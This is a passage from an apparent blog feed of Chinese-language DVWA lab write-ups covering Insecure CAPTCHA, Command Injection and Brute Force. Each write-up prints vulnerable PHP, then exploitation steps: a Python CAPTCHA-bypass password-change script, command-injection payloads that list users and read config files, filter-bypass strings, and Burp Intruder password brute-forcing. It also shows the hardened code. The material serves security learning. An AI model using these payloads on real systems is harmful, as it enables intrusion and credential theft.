class="string">'http://127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'reCAPTCHA'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">'http://127.0.0.1/dvwa/vulnerabilities/captcha/'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=842n4cnel00gbrkd5mi9fk98f6'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">    &#125;</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">'password_new'</span>:<span class="string">'password'</span>,</span><br><span class="line">    <span class="string">'password_conf'</span>:<span class="string">'password'</span>,</span><br><span class="line">    <span class="string">'g-recaptcha-response'</span>:<span class="string">'hidd3n_valu3'</span>,</span><br><span class="line">    <span class="string">'Change'</span>:<span class="string">'Change'</span></span><br><span class="line">    &#125;</span><br><span class="line">r=requests.post(url,headers=header,data=data)</span><br><span class="line"><span class="keyword">if</span>(<span class="string">'Password Changed.'</span>) <span class="keyword">in</span> r.text:</span><br><span class="line">    print(<span class="string">'Password Changed.'</span>)</span><br></pre></td></tr></table></figure><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Change&apos; ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Hide the CAPTCHA form </span><br><span class="line">    $hide_form = true; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_POST[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_new  = stripslashes( $pass_new ); </span><br><span class="line">    $pass_new  = mysql_real_escape_string( $pass_new ); </span><br><span class="line">    $pass_new  = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">    $pass_conf = $_POST[ &apos;password_conf&apos; ]; </span><br><span class="line">    $pass_conf = stripslashes( $pass_conf ); </span><br><span class="line">    $pass_conf = mysql_real_escape_string( $pass_conf ); </span><br><span class="line">    $pass_conf = md5( $pass_conf ); </span><br><span class="line"></span><br><span class="line">    $pass_curr = $_POST[ &apos;password_current&apos; ]; </span><br><span class="line">    $pass_curr = stripslashes( $pass_curr ); </span><br><span class="line">    $pass_curr = mysql_real_escape_string( $pass_curr ); </span><br><span class="line">    $pass_curr = md5( $pass_curr ); </span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party </span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], </span><br><span class="line">        $_SERVER[ &apos;REMOTE_ADDR&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_challenge_field&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_response_field&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail? </span><br><span class="line">    if( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly </span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">        return; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Check that the current password is correct </span><br><span class="line">        $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); </span><br><span class="line">        $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        // Do both new password match and was the current password correct? </span><br><span class="line">        if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; </span><br><span class="line">            // Update the database </span><br><span class="line">            $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; ); </span><br><span class="line">            $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR ); </span><br><span class="line">            $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">            $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">            // Feedback for the end user - success! </span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Feedback for the end user - failed! </span><br><span class="line">            echo &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">            $hide_form = false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出服务器采用了token认证机制，还采用了PDO防止SQL注入，更主要的是对于校验验证码的过程只检测了我们不可控的参数$resp-&gt;is_valid，可谓是非常完美的防御了各种漏洞。用户还必须输入当前的密码，更加完善了安全性</p>]]></content>
    
    <summary type="html">
    
      dvwa-Insecure CAPTCHA
    
    </summary>
    
      <category term="dvwa-Insecure CAPTCHA" scheme="https://Foxgrin.github.io/categories/dvwa-Insecure-CAPTCHA/"/>
    
    
      <category term="Insecure CAPTCHA" scheme="https://Foxgrin.github.io/tags/Insecure-CAPTCHA/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-Command Injection</title>
    <link href="https://Foxgrin.github.io//posts/63531/"/>
    <id>https://Foxgrin.github.io//posts/63531/</id>
    <published>2018-07-15T06:18:00.000Z</published>
    <updated>2018-07-15T09:55:42.115Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中命令注入漏洞的关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;Submit&apos;]))&#123;</span><br><span class="line">$target=$_REQUEST[&apos;ip&apos;];</span><br><span class="line">if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123;</span><br><span class="line">$cmd=shell_exec(&apos;ping &apos;.$target);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$cmd=shell_exec(&apos;ping -c 4 &apos;.$target);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>了解这里的漏洞之前，我们还是先来了解一下一些函数的使用：</p><p>(1)stristr(string,search,before_search)：搜索一个字符串在另一个字符串中首次出现的位置的剩余部分，搜索失败返回false,其中参数string表示被搜索的字符串，search表示要搜索的字符串，before_search是可选参数，默认为false，如果设置为true则返回搜索字符串在被搜索字符串首次出现的位置的前面部分</p><p>例子如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo stristr(&apos;I love php&apos;,&apos;love&apos;); ?&gt;</span><br></pre></td></tr></table></figure><p>搜索love在原字符串中首次出现位置的剩余部分，结果返回love php，验证结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>(2)php_uname(mode)：返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。 </p><p>例子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> stristr(php_uname(<span class="string">'s'</span>),<span class="string">'Windows NT'</span>);  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可见源代码中对操作系统的名称进行了检测</p><p>(3)shell_exec(cmd)：在外部执行一个命令，参数cmd即为要执行的命令</p><p>例子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=shell_exec(<span class="string">'ping 127.0.0.1'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$cmd&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>了解完这三个函数，我们就能大概了解这关是执行一个在浏览器上的ping命令程序，服务器会对操作系统的名称进行检测，如果不是Windows NT系统则执行linux系统的Ping命令。但是，由于服务器未对ip参数进行任何的过滤，因此存在严重的Command Injection(命令注入)漏洞</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们可以通过该漏洞执行我们想要执行的命令，但要保证前面ping命令格式的正确，再通过命令连接符跟上我们想要执行的命令在windows下 &amp;&amp;,&amp;,|,|| 都可以当做命令连接符，四者区别如下：</p><p>命令1 &amp;&amp; 命令2 ：先执行命令1，若命令1执行成功再执行命令2，若命令1执行不成功则不执行命令2</p><p>命令1 &amp; 命令2 ：先执行命令1，不管命令1执行成不成功都继续执行命令2</p><p>命令1 | 命令2 ：只执行命令2，前提是命令1必须执行成功</p><p>命令1 || 命令2 ：先执行命令1，若命令1执行成功则不执行命令2，若命令1执行不成功则执行命令2</p><p>然后我们就可以执行想要执行的命令了</p><p>例如要获取用户信息</p><p>输入127.0.0.1 &amp;&amp; net user</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获取ip地址信息</p><p>输入127.0.0.1 &amp;&amp; ipconfig</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获取arp表信息</p><p>输入127.0.0.1 &amp;&amp; arp -a</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还可以利用type命令查看一些配置文件内容，前提是已经文件绝对路径</p><p>例如查看mysql配置信息</p><p>输入127.0.0.1 | type C:\phpStudy\PHPTutorial\MySQL\my.ini</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可见，该漏洞的危害是很大的，攻击者可以执行任意想执行的命令</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;Submit&apos;]))&#123;</span><br><span class="line">$target=$_REQUEST[&apos;ip&apos;];</span><br><span class="line">$substitutions=array(</span><br><span class="line">&apos;&amp;&amp;&apos;=&gt;&apos;&apos;,</span><br><span class="line">&apos;;&apos;=&gt;&apos;&apos;</span><br><span class="line">);</span><br><span class="line">$target=str_replace(array_keys($substitutions),$substitutions,$target);</span><br><span class="line">if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123;</span><br><span class="line">$cmd=shell_exec(&apos;ping &apos;.$target);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$cmd=shell_exec(&apos;ping -c 4 &apos;.$target);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里我们还是先来了解几个函数：</p><p>(1)array_keys(array,value,strict)：返回包含数组中所有键名的新数组，参数array为所选数组，value为指定键值，若输入则返回键值对应的键名，strict指定依赖类型</p><p>例子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$substitutions=<span class="keyword">array</span>(</span><br><span class="line"><span class="string">'&amp;&amp;'</span>=&gt;<span class="string">''</span>,</span><br><span class="line"><span class="string">';'</span>=&gt;<span class="string">''</span></span><br><span class="line">);</span><br><span class="line">print_r(array_keys($substitutions));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>(2)str_replace(find,replace,string,count)：以其他字符替换所选字符串中的指定字符，参数find为查找的字符，replace为替换的字符，string为所选的字符串，count为计算替换数的变量</p><p>了解了这两个函数，我们就可以这关对’&amp;&amp;’和’;’这两个字符进行了过滤，但是str_replace函数是非常不安全的，因为它只进行了一次的替换，最普遍的绕过方法就是双写绕过，但是这里&amp;&amp;由于都是同样的字符无法双写，但是服务器还对’;’字符进行了过滤，所以我们可以输入</p><p>127.0.0.1 &amp;;&amp; net user，由于只过滤了一次，过滤字符’;’后就剩下了&amp;&amp;，结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>虽然&amp;&amp;被过滤了，但是命令连接符还有&amp;和|可以使用，注意三者的区别即可</p><p>输入127.0.0.1 | net user</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;Submit&apos;]))&#123;</span><br><span class="line">$target=trim($_REQUEST[&apos;ip&apos;]);</span><br><span class="line">$substitutions = array( </span><br><span class="line">        &apos;&amp;&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;;&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;| &apos; =&gt; &apos;&apos;, </span><br><span class="line">        &apos;-&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;$&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;(&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;)&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;`&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;||&apos; =&gt; &apos;&apos;, </span><br><span class="line">    ); </span><br><span class="line">    $target=str_replace(array_keys($substitutions),$substitutions,$target);</span><br><span class="line">    if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123;</span><br><span class="line">    $cmd=shell_exec(&apos;ping &apos;.$target);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">    $cmd=shell_exec(&apos;ping -c 4 &apos;.$target);</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关过滤的字符较为完全，其中过滤了字符’&amp;’，也就是说连接符&amp;&amp;和&amp;都不能使用了，还过滤了字符’|’和’||’，但仔细看是过滤了’| ‘而不是’|’，(|后面还有一个空格)，也就是说连接符|还可以使用</p><p>输入127.0.0.1|net user</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还可以在||中间加一个被过滤的字符，例如；</p><p>但是必须保证ping 命令执行失败才执行||之后的命令</p><p>输入11 |;| net user</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功绕过过滤</p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Submit&apos; ]  ) ) &#123; </span><br><span class="line"></span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line"></span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line"></span><br><span class="line">    $target = $_REQUEST[ &apos;ip&apos; ]; </span><br><span class="line"></span><br><span class="line">    $target = stripslashes( $target ); </span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects </span><br><span class="line"></span><br><span class="line">    $octet = explode( &quot;.&quot;, $target ); </span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer </span><br><span class="line"></span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // If all 4 octets are int&apos;s put the IP back together. </span><br><span class="line"></span><br><span class="line">        $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; </span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command. </span><br><span class="line"></span><br><span class="line">        if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123; </span><br><span class="line"></span><br><span class="line">            // Windows </span><br><span class="line"></span><br><span class="line">            $cmd = shell_exec( &apos;ping  &apos; . $target ); </span><br><span class="line"></span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        else &#123; </span><br><span class="line"></span><br><span class="line">            // *nix </span><br><span class="line"></span><br><span class="line">            $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target ); </span><br><span class="line"></span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        // Feedback for the end user </span><br><span class="line"></span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    else &#123; </span><br><span class="line"></span><br><span class="line">        // Ops. Let the user name theres a mistake </span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line"></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先还是先了解几个函数：</p><p>(1)explode(separator,string,limit)：将字符串打散成数组，返回组成的数组，参数separator为分隔符，规定在哪里开始分割字符串，string为要分割的字符串，limit规定所返回的数组元素的数目</p><p>(2)is_numeric(string)：检测string是否为数字或数字字符串，是则返回true，不是则返回false</p><p>(3)sizeof(array,mode)：计算数组中的元素个数</p><p>这里首先采用了token令牌机制，用户每次提交表单时都附带提交一个token值，服务器将提交的token值与session或cookie中存储的token值进行比较，相同则通过请求，不同则过滤请求</p><p>然后将输入的ip值以字符’.’为分隔符打散成一个数组，并检测数组中的每个元素是否为数字并且数组元素个数是否为4，这就限制了我们输入的值必须是一个正确格式的ip地址</p><p>也就是说只有“数字.数字.数字.数字”的输入才会被执行，非常完美的防止了命令注入漏洞</p>]]></content>
    
    <summary type="html">
    
      dvwa-Command Injection
    
    </summary>
    
      <category term="dvwa-Command Injection" scheme="https://Foxgrin.github.io/categories/dvwa-Command-Injection/"/>
    
    
      <category term="Command Injection" scheme="https://Foxgrin.github.io/tags/Command-Injection/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-Brute Force</title>
    <link href="https://Foxgrin.github.io//posts/22283/"/>
    <id>https://Foxgrin.github.io//posts/22283/</id>
    <published>2018-07-14T07:50:00.000Z</published>
    <updated>2018-07-14T13:50:44.048Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中暴力破解的一些关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Login&apos;]))&#123;</span><br><span class="line">$user=$_GET[&apos;username&apos;];</span><br><span class="line">$pass=$_GET[&apos;password&apos;];</span><br><span class="line">$pass=md5($pass);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE user=&apos;$user&apos; AND password=&apos;$pass&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">if($result &amp;&amp; mysql_num_rows($result) == 1)&#123;</span><br><span class="line">$avatar=mysql_result($result,0,&apos;avatar&apos;);</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area $user&lt;/p&gt;&quot;; </span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的关卡是一个用户登录的界面，用户必须正确输入用户名和密码才能成功登录，我们从源代码来看，服务器只对是否GET了一个Login值进行了检测，存在了明显的sql注入漏洞，攻击者不仅可以通过sql注入获取用户信息，还可以利用暴力破解的方法获取用户密码，这就是Brute Force(暴力破解)</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>(1)利用burpsuite爆破密码</p><p>首先抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>因为我们要对password参数进行爆破，所以在password参数的内容两边加上$</p><p>然后将包发送到intruder模块，选中Payloads，载入字典，点击爆破</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/3.png" alt="" title="">                </div>                <div 